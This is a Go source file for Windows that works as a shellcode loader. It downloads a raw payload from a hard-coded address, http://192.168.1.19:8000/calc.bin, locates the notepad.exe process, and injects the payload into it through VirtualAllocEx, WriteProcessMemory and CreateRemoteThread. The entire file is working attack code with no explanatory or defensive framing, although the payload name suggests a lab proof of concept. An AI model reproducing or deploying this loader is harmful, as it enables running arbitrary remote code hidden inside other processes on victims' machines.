package main

import (
	"fmt"
	"io"
	"net/http"
	"syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)


var (
    kernel32          = syscall.NewLazyDLL("kernel32.dll")
    VirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
    OpenProcess       = kernel32.NewProc("OpenProcess")
    CloseHandle       = kernel32.NewProc("CloseHandle")
)

const (
    PROCESS_ALL_ACCESS    = 0x1F0FFF
    MEM_COMMIT            = 0x1000
    MEM_RESERVE           = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

func GetPayloadFromUrl() ([]byte, error) {
	// URL of the payload
	url := "http://192.168.1.19:8000/calc.bin"

	// Make the HTTP request
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to open URL: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to download file: HTTP status %d", resp.StatusCode)
	}

	// Allocate a buffer to read the response
	var payload []byte
	tmpBuffer := make([]byte, 1024) // Temporary buffer of 1024 bytes

	for {
		// Read up to 1024 bytes from the response body
		bytesRead, err := resp.Body.Read(tmpBuffer)
		if err != nil && err != io.EOF {
			return nil, fmt.Errorf("failed to read from response body: %v", err)
		}

		// If no more bytes are left to read, break the loop
		if bytesRead == 0 {
			break
		}

		// Append the read bytes to the payload
		payload = append(payload, tmpBuffer[:bytesRead]...)

		// If we've reached the end of the file, exit the loop
		if bytesRead < 1024 {
			break
		}
	}

	// Return the downloaded payload
	return payload, nil
}

func main() {
	// Download the payload from the specified URL
	shellcode, err := GetPayloadFromUrl()
	if err != nil {
		fmt.Printf("Failed to get payload: %v\n", err)
		return
	}

	// Print the size of the downloaded payload
	fmt.Printf("Downloaded payload size: %d bytes\n", len(shellcode))

	// Optionally, do something with the payload here...
	// Find the PID of notepad.exe
    pid, err := findProcessID("notepad.exe")
    if err != nil {
        fmt.Println("Failed to find process:", err)
        return
    }

    fmt.Printf("Found notepad.exe with PID %d\n", pid)

    // Open a handle to the target process
    processHandle, _, err := OpenProcess.Call(PROCESS_ALL_ACCESS, uintptr(0), uintptr(pid))
    if processHandle == 0 {
        fmt.Println("Failed to open target process:", err)
        return
    }
    defer CloseHandle.Call(processHandle)

    fmt.Printf("Opened process handle 0x%x\n", processHandle)

    // Allocate memory in the target process
    remoteAddr, _, err := VirtualAllocEx.Call(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if remoteAddr == 0 {
        fmt.Println("Memory allocation error:", err)
        return
    }

    // Write the shellcode into the allocated memory
    var written uintptr
    ret, _, err := WriteProcessMemory.Call(processHandle, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
    if ret == 0 {
        fmt.Println("Failed to write shellcode to target process:", err)
        return
    }

    // Create a remote thread in the target process to execute the shellcode
    threadHandle, _, err := CreateRemoteThread.Call(processHandle, 0, 0, remoteAddr, 0, 0, 0)
    if threadHandle == 0 {
        fmt.Println("Failed to create remote thread:", err)
        return
    }
    defer CloseHandle.Call(threadHandle)

    fmt.Println("Shellcode executed successfully.")
}

// findProcessID finds the PID of a running process by its name
func findProcessID(processName string) (uint32, error) {
    var processEntry windows.ProcessEntry32
    processEntry.Size = uint32(unsafe.Sizeof(processEntry))

    snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
    if err != nil {
        return 0, err
    }
    defer windows.CloseHandle(snapshot)

    if err := windows.Process32First(snapshot, &processEntry); err != nil {
        return 0, err
    }

    for {
        if windows.UTF16ToString(processEntry.ExeFile[:]) == processName {
            return processEntry.ProcessID, nil
        }
        if err := windows.Process32Next(snapshot, &processEntry); err != nil {
            break
        }
    }
    return 0, fmt.Errorf("process not found")
}
